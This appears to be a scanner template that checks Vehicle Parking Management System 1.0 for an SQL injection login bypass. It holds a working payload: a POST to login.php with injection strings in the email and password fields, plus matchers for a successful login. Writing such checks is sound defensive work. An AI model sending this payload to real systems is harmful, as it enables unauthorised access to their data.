id: vpms-auth-bypass
brief:
    title: Vehicle Parking Management System 1.0 - SQL Injection
    by: dwisiswant0
    level: critical
    about: Vehicle Parking Management System 1.0 contains a SQL injection vulnerability via the password parameter. An attacker can possibly obtain sensitive information from a database, modify data, and exec...
    label:
        - auth-bypass
        - edb
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/login.php'
      head:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8
        Referer: '{{BaseURL}}/login.php'
      body: email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1
      signs:
        - "on": word
          has:
            - LAGOS PARKER
            - Login Successfully
            - location.href = 'index.php';
          in: body
          need: all
        - "on": status
          status:
            - 200
